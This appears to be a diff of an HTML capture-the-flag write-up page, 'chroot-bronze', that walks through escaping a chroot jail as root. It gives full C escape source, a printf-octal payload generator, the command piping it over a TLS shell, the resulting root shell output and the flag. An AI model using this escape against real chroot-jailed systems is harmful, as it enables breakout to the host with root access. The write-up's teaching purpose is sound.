@@ -7,7 +7,7 @@
 <meta name="description" content="Root inside a bare chroot. Ship an ELF with `printf` octal escapes, run it via `ld.so` to dodge the missing `+x`, then the classic `chroot`/`chdir(&quot;..&quot;)` walk-out." />
 <link rel="icon" href="../images/Logo-nobg.png" type="image/png" />
 <link rel="stylesheet" href="../css/fonts.css?v=2" />
-<link rel="stylesheet" href="../css/styles.css?v=16" />
+<link rel="stylesheet" href="../css/styles.css?v=17" />
 <script>document.documentElement.classList.add('js');</script>
 </head>
 <body>
@@ -56,7 +56,8 @@
   </div>
 </nav>
 
-<main class="wu-main container" id="top">
+<div class="wu-progress" aria-hidden="true"><div class="wu-progress-bar" id="wuProgress"></div></div>
+  <main class="wu-main container" id="top">
   <div class="wu-crumbs"><a href="../index.html#top">nxt_ctfs</a> <span>/</span> <a href="../writeups.html">writeups</a> <span>/</span> <span>chroot-bronze</span></div>
 
   <header class="wu-head">
@@ -78,9 +79,15 @@
 <ul>
 <li><strong>Task ID:</strong> 13</li>
 <li><strong>Type:</strong> <code>dynamic_docker</code> (personal instance)</li>
-<li><strong>Description:</strong> <em>&quot;Why do you need Docker when you have chroot?&quot;</em> - connect via TLS:<pre><code>openssl s_client -connect &lt;id&gt;.tcp.kit.sasc.tf:443 -servername &lt;id&gt;.tcp.kit.sasc.tf -quiet
-</code></pre>
-</li>
+<li><strong>Description:</strong> <em>&quot;Why do you need Docker when you have <button type="button" class="wu-gloss" data-def="A syscall that changes a process's apparent root directory, used to sandbox or jail it.">chroot</button>?&quot;</em> - connect via TLS:<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-1" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-1"><code class="language-text">openssl s_client -connect &lt;id&gt;.tcp.kit.sasc.tf:443 -servername &lt;id&gt;.tcp.kit.sasc.tf -quiet</code></pre>
+      
+    </figure></li>
 </ul>
 <h2 id="tldr"><a class="wu-anchor" href="#tldr" aria-hidden="true">#</a>TL;DR</h2>
 <p>The service drops you into <code>/bin/sh</code> running <strong>as root</strong> inside a <code>chroot</code> jail.
@@ -89,17 +96,29 @@
 real host filesystem outside the jail.</p>
 <h2 id="recon"><a class="wu-anchor" href="#recon" aria-hidden="true">#</a>Recon</h2>
 <p>Start the instance and connect:</p>
-<pre><code class="language-bash">/Users/dan/ctf/kaspersky/kasperskyinstance start 13 --wait
-# tcp://&lt;id&gt;.tcp.kit.sasc.tf:443
-</code></pre>
-<p>The shell is extremely bare - most commands are missing (<code>id</code>, <code>ls</code>, <code>uname</code>, <code>cat</code>,
+<figure class="wu-code" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-2" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-2"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">/Users/dan/ctf/kaspersky/kasperskyinstance start 13 --<span class="hljs-built_in">wait</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-comment"># tcp://&lt;id&gt;.tcp.kit.sasc.tf:443</span></span></span></code></pre>
+      
+    </figure><p>The shell is extremely bare - most commands are missing (<code>id</code>, <code>ls</code>, <code>uname</code>, <code>cat</code>,
 <code>head</code> are all &quot;not found&quot;). Only shell builtins work. Using globbing (<code>echo /*</code>) we map
 the entire jail:</p>
-<pre><code>/bin/sh
+<figure class="wu-code wu-code-output" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-3" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-3"><code class="language-text">/bin/sh
 /lib/x86_64-linux-gnu/libc.so.6
-/lib64/ld-linux-x86-64.so.2
-</code></pre>
-<ul>
+/lib64/ld-linux-x86-64.so.2</code></pre>
+      
+    </figure><ul>
 <li>No <code>/proc</code>, <code>/etc</code>, <code>/tmp</code>, <code>/home</code>, <code>/root</code>.</li>
 <li>No flag inside the jail → this is a <strong>chroot escape</strong> challenge.</li>
 </ul>
@@ -127,43 +146,73 @@ dynamically-linked binary built on the host runs fine under the jail&#39;s libc
 (backward compatibility).</p>
 <h2 id="exploit"><a class="wu-anchor" href="#exploit" aria-hidden="true">#</a>Exploit</h2>
 <h3 id="1-escape-program-escapec"><a class="wu-anchor" href="#1-escape-program-escapec" aria-hidden="true">#</a>1. Escape program - <a href="escape.c"><code>escape.c</code></a></h3>
-<pre><code class="language-c">#include &lt;sys/stat.h&gt;
-#include &lt;unistd.h&gt;
-int main(void){
-    mkdir(&quot;.x&quot;, 0755);
-    chroot(&quot;.x&quot;);                     // cwd is now OUTSIDE the new root
-    for(int i=0;i&lt;256;i++) chdir(&quot;..&quot;); // walk up to the real /
-    chroot(&quot;.&quot;);                      // re-root at the real filesystem
-    char *args[] = {&quot;/bin/sh&quot;,&quot;-c&quot;,
-      &quot;PATH=/bin:/usr/bin:/sbin:/usr/sbin; echo ==WHOAMI==; id; &quot;
-      &quot;echo ==FINDFLAG==; ls -la /; cat /flag* 2&gt;/dev/null; &quot;
-      &quot;find / -maxdepth 3 -iname &#39;*flag*&#39; 2&gt;/dev/null &quot;
-      &quot;-exec echo {} \\; -exec cat {} \\;&quot;, NULL};
-    execv(&quot;/bin/sh&quot;, args);           // real host /bin/sh with coreutils
-    return 0;
-}
-</code></pre>
-<p>Why it works: after <code>chroot(&quot;.x&quot;)</code> the kernel changes the process root but leaves the
+<figure class="wu-code" data-lines="15">
+      <figcaption>
+        
+        <span class="wu-code-lang">c</span>
+        <button type="button" class="wu-copy" data-copy="#code-4" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-4"><code class="language-c"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>{</span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc">    mkdir(<span class="hljs-string">&quot;.x&quot;</span>, <span class="hljs-number">0755</span>);</span></span>
+<span class="wu-line" data-line="5"><span class="wu-ln">5</span><span class="wu-lc">    chroot(<span class="hljs-string">&quot;.x&quot;</span>);                     <span class="hljs-comment">// cwd is now OUTSIDE the new root</span></span></span>
+<span class="wu-line" data-line="6"><span class="wu-ln">6</span><span class="wu-lc">    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>;i++) chdir(<span class="hljs-string">&quot;..&quot;</span>); <span class="hljs-comment">// walk up to the real /</span></span></span>
+<span class="wu-line" data-line="7"><span class="wu-ln">7</span><span class="wu-lc">    chroot(<span class="hljs-string">&quot;.&quot;</span>);                      <span class="hljs-comment">// re-root at the real filesystem</span></span></span>
+<span class="wu-line" data-line="8"><span class="wu-ln">8</span><span class="wu-lc">    <span class="hljs-type">char</span> *args[] = {<span class="hljs-string">&quot;/bin/sh&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,</span></span>
+<span class="wu-line" data-line="9"><span class="wu-ln">9</span><span class="wu-lc">      <span class="hljs-string">&quot;PATH=/bin:/usr/bin:/sbin:/usr/sbin; echo ==WHOAMI==; id; &quot;</span></span></span>
+<span class="wu-line" data-line="10"><span class="wu-ln">10</span><span class="wu-lc">      <span class="hljs-string">&quot;echo ==FINDFLAG==; ls -la /; cat /flag* 2&gt;/dev/null; &quot;</span></span></span>
+<span class="wu-line" data-line="11"><span class="wu-ln">11</span><span class="wu-lc">      <span class="hljs-string">&quot;find / -maxdepth 3 -iname &#x27;*flag*&#x27; 2&gt;/dev/null &quot;</span></span></span>
+<span class="wu-line" data-line="12"><span class="wu-ln">12</span><span class="wu-lc">      <span class="hljs-string">&quot;-exec echo {} \\; -exec cat {} \\;&quot;</span>, <span class="hljs-literal">NULL</span>};</span></span>
+<span class="wu-line" data-line="13"><span class="wu-ln">13</span><span class="wu-lc">    execv(<span class="hljs-string">&quot;/bin/sh&quot;</span>, args);           <span class="hljs-comment">// real host /bin/sh with coreutils</span></span></span>
+<span class="wu-line" data-line="14"><span class="wu-ln">14</span><span class="wu-lc">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span></span>
+<span class="wu-line" data-line="15"><span class="wu-ln">15</span><span class="wu-lc">}</span></span></code></pre>
+      
+    </figure><p>Why it works: after <code>chroot(&quot;.x&quot;)</code> the kernel changes the process root but leaves the
 current working directory unchanged - now the cwd sits <em>above</em> (outside) the new root.
 Repeated <code>chdir(&quot;..&quot;)</code> from an out-of-root cwd climbs all the way to the real <code>/</code>, and
 <code>chroot(&quot;.&quot;)</code> re-roots the process there.</p>
 <h3 id="2-build-on-x86-64-host-ssh-pwnbox"><a class="wu-anchor" href="#2-build-on-x86-64-host-ssh-pwnbox" aria-hidden="true">#</a>2. Build on x86-64 host (<code>ssh pwnbox</code>)</h3>
-<pre><code class="language-bash">gcc -O2 -o /tmp/escape /tmp/escape.c &amp;&amp; strip /tmp/escape
-# ELF 64-bit LSB pie executable, x86-64, dynamically linked
-</code></pre>
-<h3 id="3-generate-the-transferrun-payload"><a class="wu-anchor" href="#3-generate-the-transferrun-payload" aria-hidden="true">#</a>3. Generate the transfer+run payload</h3>
-<pre><code class="language-python">d = open(&quot;escape.bin&quot;, &quot;rb&quot;).read()
-esc = &quot;&quot;.join(&quot;\\%03o&quot; % b for b in d)  # 3-digit octal per byte
-cmd = &quot;printf &#39;&quot; + esc + &quot;&#39; &gt; /e\n/lib64/ld-linux-x86-64.so.2 /e\n&quot;
-open(&quot;payload.txt&quot;, &quot;w&quot;).write(cmd)
-</code></pre>
-<h3 id="4-fire-it-over-the-tls-shell"><a class="wu-anchor" href="#4-fire-it-over-the-tls-shell" aria-hidden="true">#</a>4. Fire it over the TLS shell</h3>
-<pre><code class="language-bash">cat payload.txt | openssl s_client \
-  -connect &lt;id&gt;.tcp.kit.sasc.tf:443 \
-  -servername &lt;id&gt;.tcp.kit.sasc.tf -quiet
-</code></pre>
-<h2 id="result"><a class="wu-anchor" href="#result" aria-hidden="true">#</a>Result</h2>
-<pre><code>==WHOAMI==
+<figure class="wu-code" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-5" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-5"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">gcc -O2 -o /tmp/escape /tmp/escape.c &amp;&amp; strip /tmp/escape</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-comment"># ELF 64-bit LSB pie executable, x86-64, dynamically linked</span></span></span></code></pre>
+      
+    </figure><h3 id="3-generate-the-transferrun-payload"><a class="wu-anchor" href="#3-generate-the-transferrun-payload" aria-hidden="true">#</a>3. Generate the transfer+run payload</h3>
+<figure class="wu-code" data-lines="4">
+      <figcaption>
+        
+        <span class="wu-code-lang">python</span>
+        <button type="button" class="wu-copy" data-copy="#code-6" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-6"><code class="language-python"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">d = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;escape.bin&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">esc = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">&quot;\\%03o&quot;</span> % b <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> d)  <span class="hljs-comment"># 3-digit octal per byte</span></span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">cmd = <span class="hljs-string">&quot;printf &#x27;&quot;</span> + esc + <span class="hljs-string">&quot;&#x27; &gt; /e\n/lib64/ld-linux-x86-64.so.2 /e\n&quot;</span></span></span>
+<span class="wu-line" data-line="4"><span class="wu-ln">4</span><span class="wu-lc"><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;payload.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>).write(cmd)</span></span></code></pre>
+      
+    </figure><h3 id="4-fire-it-over-the-tls-shell"><a class="wu-anchor" href="#4-fire-it-over-the-tls-shell" aria-hidden="true">#</a>4. Fire it over the TLS shell</h3>
+<figure class="wu-code" data-lines="3">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-7" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-7"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc"><span class="hljs-built_in">cat</span> payload.txt | openssl s_client \</span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc">  -connect &lt;<span class="hljs-built_in">id</span>&gt;.tcp.kit.sasc.tf:443 \</span></span>
+<span class="wu-line" data-line="3"><span class="wu-ln">3</span><span class="wu-lc">  -servername &lt;<span class="hljs-built_in">id</span>&gt;.tcp.kit.sasc.tf -quiet</span></span></code></pre>
+      
+    </figure><h2 id="result"><a class="wu-anchor" href="#result" aria-hidden="true">#</a>Result</h2>
+<figure class="wu-code wu-code-output" data-lines="11">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-8" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-8"><code class="language-text">==WHOAMI==
 uid=0(root) gid=0(root)
 ==FINDFLAG==
 drwxr-xr-x  bin
@@ -173,18 +222,30 @@ dr-xr-xr-x  proc
 drwxr-xr-x  root
 drwxr-xr-x  sbin
 dr-xr-xr-x  sys
-kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}
-</code></pre>
-<p>We are <code>uid=0</code> on the real host root filesystem (note the full <code>bin/dev/etc/proc/sys</code>
+kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}</code></pre>
+      
+    </figure><p>We are <code>uid=0</code> on the real host root filesystem (note the full <code>bin/dev/etc/proc/sys</code>
 tree that did not exist inside the jail), and <code>cat /flag*</code> prints the flag.</p>
 <h2 id="flag"><a class="wu-anchor" href="#flag" aria-hidden="true">#</a>Flag</h2>
-<pre><code>kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}
-</code></pre>
-<p>Submitted with:</p>
-<pre><code class="language-bash">/Users/dan/ctf/kaspersky/kasperskyflag 13 &#39;kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}&#39;
-# {&quot;status&quot;: &quot;Correct&quot;}
-</code></pre>
-<h2 id="artifacts"><a class="wu-anchor" href="#artifacts" aria-hidden="true">#</a>Artifacts</h2>
+<figure class="wu-code wu-code-output" data-lines="1">
+      <figcaption>
+        
+        <span class="wu-code-lang">output</span>
+        <button type="button" class="wu-copy" data-copy="#code-9" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-9"><code class="language-text">kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}</code></pre>
+      
+    </figure><p>Submitted with:</p>
+<figure class="wu-code" data-lines="2">
+      <figcaption>
+        
+        <span class="wu-code-lang">bash</span>
+        <button type="button" class="wu-copy" data-copy="#code-10" aria-label="Copy code">copy</button>
+      </figcaption>
+      <pre id="code-10"><code class="language-bash"><span class="wu-line" data-line="1"><span class="wu-ln">1</span><span class="wu-lc">/Users/dan/ctf/kaspersky/kasperskyflag 13 <span class="hljs-string">&#x27;kaspersky{fb30b3a6-ff28-4698-b023-bfb73c4bbf63}&#x27;</span></span></span>
+<span class="wu-line" data-line="2"><span class="wu-ln">2</span><span class="wu-lc"><span class="hljs-comment"># {&quot;status&quot;: &quot;Correct&quot;}</span></span></span></code></pre>
+      
+    </figure><h2 id="artifacts"><a class="wu-anchor" href="#artifacts" aria-hidden="true">#</a>Artifacts</h2>
 <ul>
 <li><code>escape.c</code>, chroot-escape source</li>
 <li><code>escape.bin</code>, compiled x86-64 ELF (built on pwnbox)</li>
@@ -192,7 +253,10 @@ tree that did not exist inside the jail), and <code>cat /flag*</code> prints the
 <li><code>escape.b64</code> / <code>escape.bin</code>, intermediate build artifacts</li>
 </ul>
 <h2 id="takeaways"><a class="wu-anchor" href="#takeaways" aria-hidden="true">#</a>Takeaways</h2>
-<ul>
+
+<div class="wu-admon wu-admon-pitfall">
+      <p class="wu-admon-h">Pitfall</p>
+      <ul>
 <li><code>chroot</code> only changes the process root; it does <strong>not</strong> revoke <code>CAP_SYS_CHROOT</code> or
 reset the cwd, so a root process trivially escapes. It is an isolation convenience,
 not a security sandbox - hence <em>&quot;Why do you need Docker when you have chroot?&quot;</em>.</li>
@@ -200,10 +264,12 @@ not a security sandbox - hence <em>&quot;Why do you need Docker when you have ch
 <code>ld-linux.so &lt;file&gt;</code> executes non-<code>+x</code> ELFs.</li>
 </ul>
 
+    </div>
     </article>
     <nav class="wu-toc" aria-label="On this page">
+        <button type="button" class="wu-toc-toggle" aria-expanded="false">On this page</button>
         <p class="wu-toc-h">On this page</p>
-        <ol><li><a href="#tldr">TL;DR</a></li><li><a href="#recon">Recon</a></li><li><a href="#the-problem">The problem</a></li><li><a href="#exploit">Exploit</a></li><li><a href="#result">Result</a></li><li><a href="#flag">Flag</a></li><li><a href="#artifacts">Artifacts</a></li><li><a href="#takeaways">Takeaways</a></li></ol>
+        <ol><li><a href="#tldr">TL;DR</a></li><li><a href="#recon">Recon</a></li><li><a href="#the-problem">The problem</a></li><li><a href="#exploit">Exploit</a><ol class="wu-toc-sub"><li><a href="#1-escape-program-escapec">1. Escape program - escape.c</a></li><li><a href="#2-build-on-x86-64-host-ssh-pwnbox">2. Build on x86-64 host (ssh pwnbox)</a></li><li><a href="#3-generate-the-transferrun-payload">3. Generate the transfer+run payload</a></li><li><a href="#4-fire-it-over-the-tls-shell">4. Fire it over the TLS shell</a></li></ol></li><li><a href="#result">Result</a></li><li><a href="#flag">Flag</a></li><li><a href="#artifacts">Artifacts</a></li><li><a href="#takeaways">Takeaways</a></li></ol>
       </nav>
   </div>
 
@@ -243,6 +309,6 @@ not a security sandbox - hence <em>&quot;Why do you need Docker when you have ch
   </div>
 </footer>
 
-<script src="../js/script.js?v=16"></script>
+<script src="../js/script.js?v=17"></script>
 </body>
 </html>
